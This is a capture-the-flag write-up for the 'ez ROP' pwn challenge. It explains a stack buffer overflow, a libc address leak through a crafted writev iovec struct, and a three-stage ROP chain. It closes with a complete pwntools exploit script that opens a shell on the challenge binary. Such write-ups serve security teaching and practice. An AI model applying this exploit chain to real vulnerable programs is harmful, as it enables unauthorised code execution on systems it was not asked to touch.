# ez ROP
Writeup by: Ethan Andrews (UtahSec)

## Description
rop is SO easy 🙃😈

## Writeup
### Initial Looks
We aren't greeted with much when running the executable. It appears to take in user input, but then exits immediately.

![image](https://github.com/user-attachments/assets/e28d5f7a-a592-40d6-bfbf-6eeadd78e2d6)

Using checksec, we can see that NX is enabled, but no other protections are enabled.

![image](https://github.com/user-attachments/assets/e28381e5-1583-4067-8249-366f749eec4b)

### Code Analysis
In analyzing the code with Ghidra, we can see that the main function calls a read syscall that reads in stdin into a
buffer on the stack.

![image](https://github.com/user-attachments/assets/0a77c407-f7ff-47be-9420-44c206784c2a)

We can see that the buffer is `0x20` bytes away from RBP, but it reads in `0x80` bytes leading to a clear buffer overflow.

We also see another function named `weird_func()` that contains a `POP RDI` instruction.

![image](https://github.com/user-attachments/assets/494c0270-9dbc-461e-9a8c-d87c425f3e81)

### ROP Analysis
It's clear that the solution involves a ROP chaining. However, using the ROP gadget tool, and searching for
pop gadgets, there are very few at our disposal.

![image](https://github.com/user-attachments/assets/bb408ec1-57cb-48d3-8df5-e29f7b90569b)

By looking at main again, we can also see that we can control RSI by controlling RBP.

![image](https://github.com/user-attachments/assets/325b8584-9ba0-46e8-a1a9-05fd7252f9d8)

Specifically, `RSI = RBP - 0x20`.

Additionally, we know that after the read syscall finishes, it inserts the number of bytes read into the `RAX` register.

So we effectively have control over `RSI`, `RDI`, and `RAX`. One might be inclined to perform an `execve("/bin/sh")`
call, but noticeably, the `RDX` register gets set to `0x80`, and because this is not a valid place in memory,
the execve call will always fail with an error.

In searching for `RDX` gadgets, we can clearly see that there is no way of changing this.

![image](https://github.com/user-attachments/assets/0a97a3e3-3fca-4621-b610-7b5c964b56b5)

This means the only solution will involve leaking a libc address so that we can gain access to libc's gadgets. We can verify
that this binary does use libc:

![image](https://github.com/user-attachments/assets/e8e159d6-30b9-4c42-b167-f5a2adae60de)

### Leaking Libc

In order to leak libc, we can try to print the address of `__libc_start_main` in the .got table through a write instruction.
In order to write from this address into stdout, we need to set `RAX` to 1, while also setting `RSI` to this address.

The only way we can control the `RSI` value is by popping `RBP`. Then `RBP - 0x20` gets inserted into `RCX`. And
then `RCX` gets inserted into `RBP`. However, when this happens, `RAX` gets set to 0.

![image](https://github.com/user-attachments/assets/23802baa-22a5-4195-9f61-f2c947d653d7)

This means that we need to set RSI before we can set RAX to 1. So if we set RSI to `0x403fc8` (the location of the .got entry)
and then try to read in 1 byte in order to set RAX to 1, our registers before the syscall will look like:
```
RAX => 0         # Read ID
RSI => 0x403fc8  # Address of .got table
RDI => 0         # Standard Input
RDX => 0x80      # Maximum of 0x80 characters
```

However, this has two issues: 

1. If you could read in one byte, it'll destroy one byte of `0x403fc8`.
2. You won't be able to read in one byte because the .got table doesn't have write privileges.

So if you execute this syscall, it'll fail and insert a negative error code into `RAX` instead of 1.

So this is the huge issue we need to overcome: How do you set `RSI` while also being able to set `RAX`?

### writev
So the key issue is that the location in memory that `RSI` points to needs to be writeable, which means `RSI` can't directly point
to the .got table.

So instead of write, let's consider writev:

```c++
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
```

Instead of directly pointing to the location you wan't to write from, writev has you point to a list of `ioevc` structs
that contain the pointer to the buffer along with the length of the buffer.

```c++
struct iovec {
    void *iov_base;   // Pointer to the buffer
    size_t iov_len;   // Length of the buffer
};
```

So this means, we could create an artificial `iovec` struct in the writeable .data section that looks like: 

```c++
struct iovec {
  iov_base = 0x403fc8
  iov_len = 8
}
```

We could then set `RSI` to the location of this struct which would print out 8 bytes of the .got table, 
and would also allow us to set `RAX` since the .data section is writeable.

Now one might be concerned about the `RDX` register being set to `0x80` for this call since the `RDX` register
determines the number of structs in the list. Luckily, if a struct contains NULL for both its base address and its length,
writev will simply ignore the struct and move on to the next one. After doing a quick calculation, this means we need
`0x800` bytes of empty space which is much smaller than the .data section, so if we place the struct at the beginning of the .data
section, it will simply ignore all of the following empty values.

### Exploit Creation
So now that we have a clear idea, we will create the exploit using pwntools.

```python3
from pwn import *

exe = context.binary = ELF("./easy_rop")
p = process("./easy_rop")
```

We can see from GDB that the buffer is 32 bytes away from the `RBP` stack value. 

![image](https://github.com/user-attachments/assets/206e1211-39a0-4ad6-b43c-f50defd4a3f6)

This means we need 32 bytes of padding to get to the RBP value.

```python3
payload = b"\x90" * 32
```

Now we need to craft a read call to the beginning of the .data section to create our struct.
Luckily, as discussed earlier, we can just set `RBP` to `0x20` bytes above the desired `RSI` address and then jump directly
to line `0x40110a` to perform the read. We also need to add a random value for `pop rbp` because the function ends
with a `pop rbp` instruction.

```python3
payload += p64(0x404020)   # RBP Overwrite: Beginning Address of .data + 0x20
payload += p64(0x40110a)   # execute read syscall
payload += p64(0xdeadbeef) # garbage RBP value
```

Now we will send in the struct value padded to `0x14` bytes because the writev syscall requires `RAX` to be `0x14`.

```python3
input("Press Enter to send next payload\n")

struct_payload = p64(0x403fc8)   # Address of the .got table
struct_payload += p64(0x8)       # 8 bytes to read
struct_payload += b"\x00" * 4    # Padding to get the total length to 0x14
p.send(struct_payload)
```

- IMPORTANT: When all the payloads send instantly, it screws with the exploit. Normally, this is handled by having
`p.recv()` calls in between payloads, but this program does not send us any data we can use as checkpoints.
Because of this, I've added an input
statement before each payload. When the next payload is to be sent, you just press enter in the terminal to send the next payload.

Now we have `RSI` set to our struct, `RAX` set to `0x14`. We just need to set `RDI` and then perform the syscall.

We will modify our previous payload to redirect execution to the `pop rdi` instruction
found in `weird_func()`. And then we will redirect execution to the syscall.

```python3
payload += p64(0x40112e)   # Pop RDI Instruction
payload += p64(0x1)        # RDI Value
payload += p64(0xdeadbeef) # Garbage RBP Value
payload += p64(0x401126)   # syscall instruction
payload += p64(0xdeadbeef) # Garbage RBP Value
payload += p64(b"\n")
```

Then executing this syscall will print the address of `__libc_start_main` from the .got table. 
We can then capture this address and then set the context to our `libc.so.6` library provided by the docker
file.

```python3
lib = ELF("libc.so.6")

libc_address = int.from_bytes(p.recv(), byteorder="little")
lib.address = libc_address - lib.symbols["__libc_start_main"]
```

Exploit so far:

```python3
from pwn import *

exe = context.binary = ELF("./easy_rop")
p = process("./easy_rop")

payload = b"\x90" * 32
payload += p64(0x404020)   # RBP Overwrite: Beginning Address of .data + 0x20
payload += p64(0x40110a)   # execute read syscall
payload += p64(0xdeadbeef) # garbage RBP value
payload += p64(0x40112e)   # Pop RDI Instruction
payload += p64(0x1)        # RDI Value
payload += p64(0xdeadbeef) # Garbage RBP Value
payload += p64(0x401126)   # syscall instruction
payload += p64(0xdeadbeef) # Garbage RBP Value
payload += b"\n"

p.send(payload)

input("Press Enter to send next payload\n")

struct_payload = p64(0x403fc8)   # Address of the .got table
struct_payload += p64(0x8)       # 8 bytes to read
struct_payload += b"\x00" * 4    # Padding to get the total length to 0x14

p.send(struct_payload)

lib = ELF("libc.so.6")
libc_address = int.from_bytes(p.recv(), byteorder="little")
lib.address = libc_address - lib.symbols["__libc_start_main"]
```

### libc ROP chaining
Now that we have the address of libc, we can perform a simple execve("/bin/sh") rop chain. Because we are
running out of space (we are limited to `0x80` bytes per payload), we will redirect execution to main to
read in a new rop chain.

We will add the address to the end of our first payload:

```python3
payload += p64(0x401107)
```

This allows us to construct a second ropchain to send to the server. The first thing we need to do is place
the `/bin/sh` string into the data section so we can reference it for our execve call. We will do this by
calling the `pop rbp` instruction, placing the .data address into `RBP`, and then calling read. 

We will also include another call to read in a third ropchain because we are running out of space on this one as well.

```python3
input("Press Enter to send next payload\n")

second_payload = b"\x90" * 40     # Padding
second_payload += p64(0x4010ed)   # Address of pop rbp
second_payload += p64(0x404020)   # new rbp value: .data + 0x20
second_payload += p64(0x40110a)   # Address to read call
second_payload += p64(0xdeadbeef) # Garbage RBP value
second_payload += p64(0x401107)   # Read in third rop chain
second_payload += b"\n"

p.send(second_payload)
```

Now we will send the `/bin/sh` string.

```python3
input("Press Enter to send next payload\n")

p.send(b"/bin/sh\x00")
```

So now that we have the base address of libc and the location of the `/bin/sh` string (0x404000), we can do a classic
execve ropchain. I added a simple function that makes calculating the address of each gadget easy.

```python3
# Converts a libc address to its actual address based on the offset
def address(address):
    return address + lib.address

input("Press Enter to send next payload\n")

third_payload = b"\x90" * 40
third_payload += p64(address(0x0000000000084dff))  # pop rax
third_payload += p64(0x3b)                         # rax value
third_payload += p64(address(0x000000000011903c))  # pop rdi
third_payload += p64(0x404000)                     # rdi value
third_payload += p64(address(0x000000000011a3fd))  # pop rsi
third_payload += p64(0x0)                          # null
third_payload += p64(address(0x0000000000067e22))  # pop rdx
third_payload += p64(0x0)                          # null
third_payload += p64(0x401126)                     # syscall

p.send(third_payload)
```

### Final Exploit

```python3
from pwn import *

exe = context.binary = ELF("./easy_rop")
p = process("./easy_rop")

payload = b"\x90" * 32
payload += p64(0x404020)   # RBP Overwrite: Beginning Address of .data + 0x20
payload += p64(0x40110a)   # execute read syscall
payload += p64(0xdeadbeef) # garbage RBP value
payload += p64(0x40112e)   # Pop RDI Instruction
payload += p64(0x1)        # RDI Value
payload += p64(0xdeadbeef) # Garbage RBP Value
payload += p64(0x401126)   # syscall instruction
payload += p64(0xdeadbeef) # Garbage RBP Value
payload += p64(0x401107)   # read in second rop chain
payload += b"\n"

p.send(payload)

input("Press Enter to send next payload\n")

struct_payload = p64(0x403fc8)   # Address of the .got table
struct_payload += p64(0x8)       # 8 bytes to read
struct_payload += b"\x00" * 4    # Padding to get the total length to 0x14

p.send(struct_payload)

lib = ELF("libc.so.6")
libc_address = int.from_bytes(p.recv(), byteorder="little")
lib.address = libc_address - lib.symbols["__libc_start_main"]

input("Press Enter to send next payload\n")

second_payload = b"\x90" * 40     # Padding
second_payload += p64(0x4010ed)   # Address of pop rbp
second_payload += p64(0x404020)   # new rbp value: .data + 0x20
second_payload += p64(0x40110a)   # Address to read call
second_payload += p64(0xdeadbeef) # Garbage RBP value
second_payload += p64(0x401107)   # Read in third rop chain
second_payload += b"\n"

p.send(second_payload)

input("Press Enter to send next payload\n")

p.send(b"/bin/sh\x00")

# Converts a libc address to its actual address based on the offset
def address(address):
    return address + lib.address

input("Press Enter to send next payload\n")

third_payload = b"\x90" * 40
third_payload += p64(address(0x0000000000084dff))  # pop rax
third_payload += p64(0x3b)                         # rax value
third_payload += p64(address(0x000000000011903c))  # pop rdi
third_payload += p64(0x404000)                     # rdi value
third_payload += p64(address(0x000000000011a3fd))  # pop rsi
third_payload += p64(0x0)                          # null
third_payload += p64(address(0x0000000000067e22))  # pop rdx
third_payload += p64(0x0)                          # null
third_payload += p64(0x401126)                     # syscall

p.send(third_payload)

p.interactive()
```

This gives a shell and you can simply `cat flag.txt`.

## Important Concepts
- libc rop chaining
- writev
- address leaks



